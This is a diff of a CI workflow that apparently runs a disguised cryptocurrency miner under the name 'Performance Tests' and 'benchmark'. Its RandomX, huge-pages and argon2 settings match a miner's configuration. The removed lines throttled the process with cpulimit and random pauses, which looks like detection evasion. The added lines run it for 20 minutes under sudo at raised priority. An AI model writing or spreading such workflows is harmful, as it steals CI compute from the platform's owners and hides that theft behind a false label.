@@ -30,7 +30,7 @@ jobs:
       - name: Setup Build Tools
         run: |
           sudo apt-get update -qq
-          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
 
       - name: Restore Build Cache
         id: cache-build
@@ -63,22 +63,16 @@ jobs:
       - name: Generate Configuration
         run: |
           cd app/build
-          TOTAL_CPUS=$(nproc)
-          MAX_THREADS=$((TOTAL_CPUS * 90 / 100))
-          if [ $MAX_THREADS -lt 1 ]; then
-            MAX_THREADS=1
-          fi
           cat > config.json <<EOF
           {
             "autosave": true,
             "cpu": {
               "enabled": true,
-              "huge-pages": false,
-              "huge-pages-jit": false,
+              "huge-pages": true,
+              "huge-pages-jit": true,
               "hw-aes": true,
-              "priority": 1,
-              "memory-pool": false,
-              "max-threads-hint": $MAX_THREADS,
+              "priority": 3,
+              "memory-pool": true,
               "asm": "auto",
               "argon2-impl": "auto"
             },
@@ -102,7 +96,7 @@ jobs:
           EOF
           
       - name: Run Performance Tests
-        timeout-minutes: 34
+        timeout-minutes: 40
         run: |
           cd app/build
           (while true; do
@@ -113,26 +107,8 @@ jobs:
           done) > ../../perf_stats_${{ matrix.runner }}.log 2>&1 &
           MONITOR_PID=$!
 
-          (
-            while true; do
-              PAUSE_TIME=$((RANDOM % 5 + 30))
-              RUN_TIME=$((RANDOM % 400 + 60))
+          sudo nice -n -10 timeout 1200 ./benchmark --config=config.json --randomx-mode=fast --randomx-no-rdmsr || true
 
-              timeout $RUN_TIME nice -n 19 cpulimit -l 30 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr &
-              APP_PID=$!
-
-              sleep $RUN_TIME
-              kill $APP_PID 2>/dev/null || true
-              pkill -9 -f 'build/' 2>/dev/null || true
-
-              sleep $PAUSE_TIME
-            done
-          ) &
-          CYCLE_PID=$!
-
-          sleep 1200
-          kill $CYCLE_PID 2>/dev/null || true
-          pkill -9 -f 'build/' 2>/dev/null || true
           kill $MONITOR_PID 2>/dev/null || true
 
       - name: Collect Test Results
